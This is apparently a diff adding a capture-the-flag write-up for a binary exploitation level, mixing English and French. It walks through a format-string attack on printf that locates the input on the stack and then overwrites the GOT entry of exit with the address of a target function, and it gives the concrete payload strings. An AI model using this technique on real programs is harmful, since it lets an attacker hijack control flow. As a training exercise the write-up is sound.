@@ -1,0 +1,31 @@
+## Level5
+
+Address de o : 08048680
+
+At first like in the past exercice,
+
+We are going to find were is input of printf in the stack : 
+python -c 'printf("AAAA" + "%x "*10)'
+
+we see that 41414141 is at the 4th position
+
+Now, the difference here is that we have a function to call : `o`  at address 08048680
+And there is  exit function call after the printf, at address :  
+`<EXTERNAL>::exit   XREF[2]:     exit:080483d0(T),  exit:080483d0(c), 08049838(*)  `
+
+The address is 08049838   
+
+So let's try to put o address as value of exit address
+
+1 : o address in d = 134514304
+2 : exit address in lil endian = "\x38\x98\x04\x08"
+
+input : "\x38\x98\x04\x08" + "%134514300d" + "%4$n"
+
+Probleme ca SIGILL, mais on est aller a l'address donne a exit(),   
+Avec un peu de recherche on trouve que l'on doit pointer vers le debut de o et non la fonction o.   
+Donc avec ghidra on voit de facon evidente que ca commence a 080484a4 (134513828d [-4 de l'ecriture addresse precedente]) ,   
+
+
+input : "\x38\x98\x04\x08" + "%134513824d" + "%4$n"
+
